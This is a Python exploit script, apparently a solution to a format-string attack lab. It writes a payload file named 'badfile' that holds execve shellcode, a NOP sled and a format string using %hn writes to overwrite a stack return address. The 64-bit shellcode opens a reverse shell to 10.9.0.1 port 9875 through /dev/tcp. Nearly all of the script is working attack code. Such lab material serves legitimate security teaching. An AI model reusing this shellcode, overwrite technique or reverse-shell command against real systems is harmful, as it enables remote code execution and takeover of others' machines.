#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/ls -l; echo '===== Success! ======'                  *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')


# 64-bit Generic Shellcode 
shellcode_64 = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i >& /dev/tcp/10.9.0.1/9875 0>&1               *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Choose the shellcode version based on your target
shellcode = shellcode_64

# Put the shellcode somewhere in the payload
start = 1000               # Change this number
content[start:start + len(shellcode)] = shellcode

############################################################
#
#    Construct the format string here

# modify the value (32-bit) at 0x00007fffffffe0b8 to 0x00007fffffffe558
# since all addresses start with 0x0000, we don't need to modify the highest 2 bytes
# step 1. modify 2 bytes from 0x00007fffffffe0bc to 0x7fff
# step 2. modify 2 bytes from 0x00007fffffffe0ba to 0xffff
# step 3. modify 2 bytes from 0x00007fffffffe0b8 to 0xe558

# this value should be carefully selected
# it should be large enough to ensure that there is enough space for fmt
offset  = 920

second2 = 0x00007fffffffe0bc
third2  = 0x00007fffffffe0ba
fourth2 = 0x00007fffffffe0b8
padding = 0x111111119add1009

content[offset+0 :offset+8]   =  (second2).to_bytes(8,byteorder='little')
content[offset+8 :offset+16]  =  (padding).to_bytes(8,byteorder='little')
content[offset+16:offset+24]  =  (fourth2).to_bytes(8,byteorder='little')
content[offset+24:offset+32]  =  (padding).to_bytes(8,byteorder='little')
content[offset+32:offset+40]  =   (third2).to_bytes(8,byteorder='little')

# 149 "lx" are needed to get the value 0x00007fffffffe0bc in the input
# first:  0x7fff-(16*72) = 31615
# second: 0xe558-0x7fff  = 25945
# third:  0xffff-0xe558  = 6823
s = "%.16lx"*147 + "%.30415lx" + "%hn" + "%.25945lx" + "%hn" + "%.6823lx" + "%hn"

fmt  = (s).encode('latin-1')
content[0:len(fmt)] = fmt

# 
############################################################

# Save the format string to file
with open('badfile', 'wb') as f:
    f.write(content)